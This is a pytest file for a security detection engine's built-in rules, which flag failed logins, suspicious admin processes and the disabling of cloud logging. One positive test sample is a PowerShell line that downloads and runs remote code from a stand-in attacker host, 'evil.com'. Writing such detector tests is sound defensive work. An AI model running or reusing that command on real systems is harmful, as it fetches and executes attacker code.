import pytest
import uuid
import datetime
from autosoc_detection.rules.registry import RuleRegistry
from autosoc_detection.evaluators.predicate import PredicateEvaluator
from autosoc_schemas.events.normalized import NormalizedSecurityEvent

@pytest.fixture
def registry():
    reg = RuleRegistry("rules/builtin")
    reg.load_rules()
    return reg

def make_event(**kwargs):
    default = {
        "event_id": uuid.uuid4(),
        "normalized_event_id": uuid.uuid4(),
        "ingestion_id": uuid.uuid4(),
        "source_id": "test_src",
        "source_type": "test_type",
        "event_category": "unknown",
        "event_type": "unknown",
        "event_outcome": "unknown",
        "received_at": datetime.datetime.now(),
        "normalized_at": datetime.datetime.now(),
        "raw_event_reference": "ref",
        "raw_payload_hash": "hash",
        "parser_name": "test",
        "parser_version": "1.0"
    }
    default.update(kwargs)
    return NormalizedSecurityEvent(**default)

def test_auth_001_failed_login(registry):
    rule = registry.rules.get("auth_001_failed_login_burst")
    assert rule is not None
    
    # Positive
    event = make_event(event_category="authentication", event_outcome="failure")
    assert PredicateEvaluator.evaluate(rule.condition, event) is True
    
    # Negative
    event2 = make_event(event_category="authentication", event_outcome="success")
    assert PredicateEvaluator.evaluate(rule.condition, event2) is False

def test_proc_001_suspicious_admin(registry):
    rule = registry.rules.get("proc_001_suspicious_admin")
    assert rule is not None
    
    # Positive
    event = make_event(event_category="process", process_name="whoami.exe")
    assert PredicateEvaluator.evaluate(rule.condition, event) is True
    
    # Positive Powershell
    event2 = make_event(event_category="process", process_name="powershell.exe", command_line="iex (new-object net.webclient).downloadstring('http://evil.com')")
    assert PredicateEvaluator.evaluate(rule.condition, event2) is True
    
    # Negative
    event3 = make_event(event_category="process", process_name="explorer.exe")
    assert PredicateEvaluator.evaluate(rule.condition, event3) is False

def test_cloud_001_logging_disabled(registry):
    rule = registry.rules.get("cloud_001_logging_disabled")
    assert rule is not None
    
    # Positive
    event = make_event(event_category="cloud", api_operation="StopLogging")
    assert PredicateEvaluator.evaluate(rule.condition, event) is True
    
    # Negative
    event2 = make_event(event_category="cloud", api_operation="DescribeInstances")
    assert PredicateEvaluator.evaluate(rule.condition, event2) is False
